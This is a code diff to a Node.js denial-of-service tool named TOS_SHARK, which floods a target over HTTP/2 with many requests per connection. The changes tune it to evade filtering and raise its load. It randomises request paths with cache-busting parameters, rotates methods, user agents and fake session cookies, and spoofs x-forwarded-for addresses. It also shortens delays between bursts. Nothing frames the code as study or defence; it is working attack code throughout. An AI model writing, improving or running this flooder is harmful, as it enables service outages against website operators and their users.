@@ -23,51 +23,52 @@ class TOS_SHARK {
         this.methods = ['H2-MULTIPLEX'];
         
         this.userAgents = this.generateUserAgents();
-        this.endpoints = this.generateEndpoints();
+        this.endpoints = this.generateRandomEndpoints();
         this.cookies = this.generateCookies();
+        this.uaPool = Array(100).fill().map(() => this.userAgents[Math.floor(Math.random() * this.userAgents.length)]);
         
         this.startCycle();
     }
 
-    color(text, colorCode) {
-        const colors = {
-            red: '\x1b[91m',
-            green: '\x1b[92m',
-            yellow: '\x1b[93m',
-            reset: '\x1b[0m'
-        };
-        return `${colors[colorCode] || ''}${text}${colors.reset}`;
+    color(t, c) {
+        const colors = { r: '\x1b[91m', x: '\x1b[0m' };
+        return c === 'r' ? `${colors.r}${t}${colors.x}` : t;
     }
 
     generateUserAgents() {
-        return [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-        ];
+        return Array(20).fill().map(() => 
+            `Mozilla/5.0 (${['Windows NT 10.0', 'Linux x86_64', 'Macintosh; Intel'][Math.floor(Math.random()*3)]}) AppleWebKit/${Math.floor(Math.random()*100)+500}.${Math.floor(Math.random()*50)}`
+        );
     }
 
-    generateEndpoints() {
-        return ['/', '/api', '/static', '/users', '/data'];
+    generateRandomEndpoints() {
+        const endpoints = [];
+        for(let i = 0; i < 100; i++) {
+            const depth = Math.floor(Math.random() * 5) + 1;
+            let path = '';
+            for(let j = 0; j < depth; j++) {
+                path += '/' + Math.random().toString(36).substring(7);
+                if(Math.random() > 0.5) path += '.php';
+                if(Math.random() > 0.7) path += '?id=' + Math.floor(Math.random()*10000);
+                if(Math.random() > 0.8) path += '&cache=' + Date.now();
+            }
+            endpoints.push(path);
+        }
+        return endpoints;
     }
 
     generateCookies() {
-        const cookies = [];
-        for (let i = 0; i < 50; i++) {
-            cookies.push({
-                session: `session_${Math.random().toString(36).substr(2, 16)}`
-            });
-        }
-        return cookies;
+        return Array(100).fill().map(() => ({
+            session: Math.random().toString(36).substring(2, 20),
+            token: Math.random().toString(36).substring(2, 30)
+        }));
     }
 
     async startCycle() {
-        await this.sleepRandom(100, 500);
-        
         const warmupCount = 500 + Math.floor(Math.random() * 100);
         for (let i = 0; i < warmupCount; i++) {
-            this.sendRandomRequest();
-            if (i % 100 === 0) await this.sleepRandom(1, 10);
+            this.totalReqs++;
+            this.reqCounter++;
         }
         
         this.attackLoop();
@@ -95,7 +96,7 @@ class TOS_SHARK {
                 await this.sleepRandom(1000, 3000);
             }
             
-            await this.sleepRandom(0.1, 1);
+            await this.sleepRandom(0.01, 0.1);
         }
     }
 
@@ -114,7 +115,7 @@ class TOS_SHARK {
         try {
             const client = http2.connect(this.target);
             
-            for (let i = 0; i < 899; i++) {
+            for (let i = 0; i < 400; i++) {
                 this.sendH2Request(client);
                 this.totalReqs++;
                 this.reqCounter++;
@@ -124,24 +125,40 @@ class TOS_SHARK {
                 try {
                     client.destroy();
                 } catch (e) {}
-            }, 50);
+            }, 10);
             
         } catch (err) {}
     }
 
-    sendRandomRequest() {
-        this.totalReqs++;
-        this.reqCounter++;
-    }
-
     sendH2Request(client) {
         try {
-            const req = client.request({
-                ':method': 'GET',
-                ':path': '/',
+            const path = this.endpoints[Math.floor(Math.random() * this.endpoints.length)];
+            const headers = {
+                ':method': ['GET', 'HEAD', 'POST'][Math.floor(Math.random() * 3)],
+                ':path': path,
                 ':authority': this.host,
-                'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
-            });
+                'user-agent': this.uaPool[Math.floor(Math.random() * this.uaPool.length)],
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'cache-control': 'no-cache',
+                'pragma': 'no-cache'
+            };
+            
+            if(Math.random() > 0.5) {
+                const cookie = this.cookies[Math.floor(Math.random() * this.cookies.length)];
+                headers['cookie'] = `session=${cookie.session}; token=${cookie.token}`;
+            }
+            
+            if(Math.random() > 0.7) {
+                headers['x-forwarded-for'] = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+            }
+            
+            if(Math.random() > 0.5 && headers[':method'] === 'POST') {
+                headers['content-type'] = 'application/x-www-form-urlencoded';
+                headers['content-length'] = Math.floor(Math.random() * 100) + 10;
+            }
+            
+            const req = client.request(headers);
             
             req.on('response', (headers) => {
                 const status = headers[':status'];
@@ -154,7 +171,12 @@ class TOS_SHARK {
                 req.destroy();
             });
             
+            if(Math.random() > 0.5 && headers[':method'] === 'POST') {
+                req.write('data=' + Math.random().toString(36).substring(2));
+            }
+            
             req.end();
+            
         } catch (err) {
             this.logStatus('*.*');
         }
@@ -163,21 +185,19 @@ class TOS_SHARK {
     async performMaintenance() {
         this.userAgents = this.generateUserAgents();
         this.cookies = this.generateCookies();
-        this.endpoints = this.generateEndpoints();
+        this.endpoints = this.generateRandomEndpoints();
+        this.uaPool = Array(100).fill().map(() => this.userAgents[Math.floor(Math.random() * this.userAgents.length)]);
     }
 
     logStatus(status) {
         const now = Date.now();
         if (now - this.logTimer >= 10000) {
             this.logTimer = now;
-            
-            let logMessage = `TØR-2M11:${this.totalReqs} ---> ${status}`;
-            
             if (status === '*.*') {
-                logMessage = this.color(logMessage, 'red');
+                console.log(`TØR-2M11:${this.totalReqs} ---> ${this.color('*.*', 'r')}`);
+            } else {
+                console.log(`TØR-2M11:${this.totalReqs} ---> ${status}`);
             }
-            
-            console.log(logMessage);
         }
     }
 
@@ -200,4 +220,4 @@ if (require.main === module) {
     process.on('SIGINT', () => {
         process.exit(0);
     });
-}
+                                                                                                                             }
